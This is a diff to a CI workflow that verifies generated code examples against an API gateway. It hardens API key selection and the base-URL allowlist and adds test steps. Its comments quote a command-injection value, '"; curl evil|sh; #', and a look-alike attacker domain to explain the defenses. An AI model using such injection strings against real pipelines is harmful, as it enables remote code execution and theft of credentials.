@@ -8,8 +8,9 @@
 # ubuntu-latest 预装全部所需运行时(node/python/go/JDK/dotnet/ruby/curl),脚本按「探测到才跑」
 # 自动覆盖 7 语言;缺什么标 skip 不阻塞。
 #
-# secrets.VERIFY_API_KEY 必须与 base 匹配:打测试域传 base=https://test-gateway.example(测试站 key),
+# secrets.VERIFY_API_KEY 必须与 base 匹配:打测试域传 base=vars.VERIFY_TEST_BASE 配的那个域(测试站 key),
 # 默认 base=aihubmix.com 则须换主站 key。示例调用是真实计费,单模型约 14 次最小请求。
+# 测试域不写死在公开仓里,配置在仓的 Actions variable `VERIFY_TEST_BASE`(形如 https://test.example.com)。
 name: verify-codegen
 
 # run-name 必须含 external_id:网关按「run-name 含 external_id」对账轮询(与 canon verify 同约定)
@@ -69,10 +70,21 @@ jobs:
       - name: Unit tests
         run: pnpm test
 
+      # 分类器回归:classify() 判定「这次真跑算成功还是失败」。它坏了(比如把 {"error":...}
+      # 判成成功)下面的联网验证就会产出**假绿报告**——比不跑更危险,所以必须排在真跑之前。
+      - name: Verify classifier regression
+        run: pnpm test:verify-classify
+
       # 构建产物的 CJS 互操作只有裸 node 验得到:vitest 跑的是 src/ 的 TS 源码。
       # 消费方 inferera-web 的 prerender-models.js 是 CommonJS,这条坏了它构建期直出正文就会炸。
       - name: Node smoke (require dist/index.cjs)
         run: pnpm smoke
+
+      # 类型侧的同一条路径:CJS 消费者的 tsc 走 dist/index.d.cts。上面 smoke 只验运行期,
+      # 这条断了运行期照样绿,只有消费端 tsc 报 TS7016——本仓一点声音都没有。
+      # 放在 smoke 之后:它复用刚构好的 dist,不用再构一遍。
+      - name: CJS type resolution (nodenext)
+        run: pnpm test:cjs-types
 
       # python 示例 import openai/anthropic;runner 裸 python 没有(本地开发机装过所以跑不出)。
       - name: Install Python SDKs
@@ -82,24 +94,27 @@ jobs:
         env:
           # key 按 base **精确匹配**选(不用 contains 子串——`https://aihubmix.com.evil.net`
           # 能骗过子串匹配拿到 prod key,harness 再把它真发到攻击者域→凭证外泄)。
-          # 空 / 精确 aihubmix.com → 生产 key;精确 test-gateway.example → 测试 key;其余 → 空(下方 shell 拒)。
-          VERIFY_API_KEY: ${{ (inputs.base == '' || inputs.base == 'https://aihubmix.com') && secrets.VERIFY_API_KEY_PROD || inputs.base == 'https://test-gateway.example' && secrets.VERIFY_API_KEY || '' }}
+          # 空 / 精确 aihubmix.com → 生产 key;精确 vars.VERIFY_TEST_BASE → 测试 key;其余 → 空(下方 shell 拒)。
+          VERIFY_API_KEY: ${{ (inputs.base == '' || inputs.base == 'https://aihubmix.com') && secrets.VERIFY_API_KEY_PROD || (inputs.base != '' && inputs.base == vars.VERIFY_TEST_BASE) && secrets.VERIFY_API_KEY || '' }}
           # inputs 一律走 env 传入,**不**内联进 run: shell(内联会被 Actions 在 shell 解析前展开→
           # `model` 传 `"; curl evil|sh; #` 即命令注入)。脚本内只用带引号的 "$VAR"。
           MODEL_INPUT: ${{ inputs.model }}
           BASE_INPUT: ${{ inputs.base }}
           STREAM_INPUT: ${{ inputs.stream }}
+          TEST_BASE: ${{ vars.VERIFY_TEST_BASE }}
         run: |
           set -o pipefail
           # base 白名单:只允许已知网关域,拒绝任意 host(纵深防御,兜住 key 选择之外的误配/攻击)。
           # base 现在会被直接注入进生成代码(ctx.baseUrl),白名单同时也是「示例里会出现哪些域」的闸门。
           case "$BASE_INPUT" in
-            ""|"https://aihubmix.com"|"https://test-gateway.example") ;;
-            *) echo "invalid base: '$BASE_INPUT' (allowed: https://aihubmix.com, https://test-gateway.example)"; exit 1;;
+            ""|"https://aihubmix.com") ;;
+            "$TEST_BASE") [ -n "$TEST_BASE" ] || { echo "VERIFY_TEST_BASE variable not configured"; exit 1; } ;;
+            *) echo "invalid base: '$BASE_INPUT' (allowed: https://aihubmix.com, \$VERIFY_TEST_BASE)"; exit 1;;
           esac
           if [ -z "$VERIFY_API_KEY" ]; then echo "no API key resolved for base='$BASE_INPUT'"; exit 1; fi
-          ARGS=(--model "$MODEL_INPUT")
-          [ -n "$BASE_INPUT" ] && ARGS+=(--base "$BASE_INPUT")
+          # 脚本不带默认域(它会被直接注入 ctx.baseUrl),默认值只在这里出现一次——
+          # 与上面的白名单、key 选择是同一处真源,不会漂。
+          ARGS=(--model "$MODEL_INPUT" --base "${BASE_INPUT:-https://aihubmix.com}")
           [ "$STREAM_INPUT" = "true" ] && ARGS+=(--stream)
           node scripts/verify-codegen.mjs "${ARGS[@]}" 2>&1 | tee verify-codegen-report.txt
 
